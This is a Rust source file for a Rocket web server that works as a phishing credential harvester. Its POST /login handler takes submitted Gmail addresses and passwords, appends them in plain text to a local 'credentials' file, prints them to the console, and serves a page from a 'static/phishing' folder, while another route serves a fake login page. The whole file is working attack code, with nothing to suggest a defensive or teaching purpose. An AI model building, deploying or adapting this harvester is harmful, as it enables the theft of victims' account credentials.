
use rocket::fs::{FileServer, relative, Options,NamedFile};
use rocket::form::Form;
use rocket::{post,get};
use rocket::{FromForm,routes};

use std::fs::OpenOptions;
use std::io::prelude::*;


#[derive(FromForm)]
struct Login {
    Email: String,
    Passwd: String,
}

#[post("/login", data = "<login>")]
async fn create_account(login: Form<Login>) -> Result<NamedFile, std::io::Error> {
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("credentials")
        .unwrap();

    if let Err(e) = writeln!(file, "GMAIL: {:#?} CONTRASEÑA: {:#?}",login.Email,login.Passwd) {
        eprintln!("Couldn't write to file: {}", e);
    }
    println!("\n\nGMAIL: {:#?} CONTRASEÑA: {:#?}\n\n",login.Email,login.Passwd);
    NamedFile::open(relative!("static/phishing/index.html")).await
}

#[get("/login")]
async fn false_page() -> Result<NamedFile, std::io::Error>{
    NamedFile::open("index.html").await
}

#[rocket::launch]
fn rocket() -> _ {
    rocket::build()
        .mount("/", FileServer::new(relative!("static"),Options::Index))
        .mount("/", routes![create_account])
}